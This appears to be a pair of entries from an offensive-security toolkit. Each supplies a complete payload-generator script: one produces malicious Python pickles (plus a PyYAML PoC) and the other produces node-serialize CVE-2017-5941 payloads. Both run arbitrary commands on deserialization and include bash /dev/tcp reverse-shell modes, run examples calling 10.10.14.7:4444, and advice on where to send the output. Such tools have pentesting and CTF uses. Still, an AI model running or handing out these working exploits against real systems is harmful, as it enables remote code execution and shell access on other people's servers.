entries.title: Python pickle RCE generator (__reduce__, cmd/revshell) + PyYAML
entries.body:
Generates a malicious Python pickle: when the object is deserialized (`pickle.loads`), `__reduce__` fires and returns `(os.system, (cmd,))` - i.e. an arbitrary command is executed. It supports two modes: a single command and a reverse shell. Use it when an application deserializes an untrusted pickle (cookie, cache, task queue, base64 API parameter). It also bundles a card about PyYAML: `yaml.load` without `SafeLoader` runs code just as dangerously.

> pickle is insecure by design - any `pickle.loads` from an untrusted source = RCE. If you see a base64 blob starting with `gASV` / `gAJ` / `KGRw` or the magic `\x80\x04`/`\x80\x02`, it is almost certainly a pickle.

```python
#!/usr/bin/env python3
# pickle_rce_gen.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
# Generate a malicious pickle whose deserialization runs a command / reverse shell.
import argparse, base64, os, pickle

class Exploit:
    # __reduce__ controls how the object is reconstructed on unpickling:
    # the returned callable+args are executed by pickle.loads().
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return (os.system, (self.cmd,))

def build(cmd):
    return pickle.dumps(Exploit(cmd))

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL pickle RCE payload generator")
    ap.add_argument("-c", "--cmd", help="command to run on the target")
    ap.add_argument("--revshell", nargs=2, metavar=("LHOST", "LPORT"),
                    help="build a bash reverse shell instead of --cmd")
    ap.add_argument("-o", "--out", help="write raw pickle bytes to this file")
    ap.add_argument("--b64", action="store_true", help="also print base64 (for cookies/JSON)")
    a = ap.parse_args()
    if a.revshell:
        lhost, lport = a.revshell
        cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    elif a.cmd:
        cmd = a.cmd
    else:
        ap.error("give -c/--cmd or --revshell LHOST LPORT")
    raw = build(cmd)
    if a.out:
        with open(a.out, "wb") as f:
            f.write(raw)
        print(f"[+] wrote {len(raw)} bytes -> {a.out}")
    if a.b64 or not a.out:
        print(base64.b64encode(raw).decode())

if __name__ == "__main__":
    main()
```

Run:
```bash
# single command, base64 output (for cookie/JSON):
python3 pickle_rce_gen.py -c "id" --b64
# reverse shell, raw bytes to a file:
python3 pickle_rce_gen.py --revshell 10.10.14.7 4444 -o payload.pkl
```

PyYAML (the same danger):
```python
# yaml.load WITHOUT SafeLoader runs arbitrary code. PoC payload:
#   !!python/object/apply:os.system ["id"]
# send this string where the server does yaml.load(data) (not safe_load).
```

entries.title: node-serialize RCE generator (CVE-2017-5941)
entries.body:
A payload generator for a vulnerability in the npm package `node-serialize` (CVE-2017-5941): its `unserialize()` executes the function body if the value is written as an IIFE (`"$$ND_FUNC$$function(){...}()"`). The script assembles such an object with a command or a reverse shell. Use it in niche cases where a Node server deserializes user input specifically via `node-serialize` (or the similar `funcster`). In practice it mostly appears in CTFs and old applications.

> Badge legacy / niche: specifically the outdated `node-serialize` is vulnerable. In modern Node applications it is almost never seen - not a flagship vector, kept for CTF/legacy.

```python
#!/usr/bin/env python3
# node_serialize_gen.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.
# Build a node-serialize (CVE-2017-5941) RCE payload (IIFE immediate-invoke trick).
import argparse, json

def build(cmd):
    # node-serialize unserialize() runs the function body; the trailing () makes it
    # self-invoke immediately on deserialization ($$ND_FUNC$$ marks a serialized fn).
    fn = ("function(){require('child_process').exec('" + cmd.replace("'", "\\'") +
          "', function(e,o,s){console.log(o);});}()")
    obj = {"rce": "$$ND_FUNC$$" + fn}
    return json.dumps(obj)

def main():
    ap = argparse.ArgumentParser(description="ARS3NAL node-serialize RCE payload (CVE-2017-5941)")
    ap.add_argument("-c", "--cmd", help="command to run")
    ap.add_argument("--revshell", nargs=2, metavar=("LHOST", "LPORT"))
    a = ap.parse_args()
    if a.revshell:
        l, p = a.revshell
        cmd = f"bash -c 'bash -i >& /dev/tcp/{l}/{p} 0>&1'"
    elif a.cmd:
        cmd = a.cmd
    else:
        ap.error("give -c/--cmd or --revshell LHOST LPORT")
    print(build(cmd))

if __name__ == "__main__":
    main()
```

Run:
```bash
python3 node_serialize_gen.py -c "id"
python3 node_serialize_gen.py --revshell 10.10.14.7 4444
# send the resulting JSON where the server does serialize.unserialize(input)
```
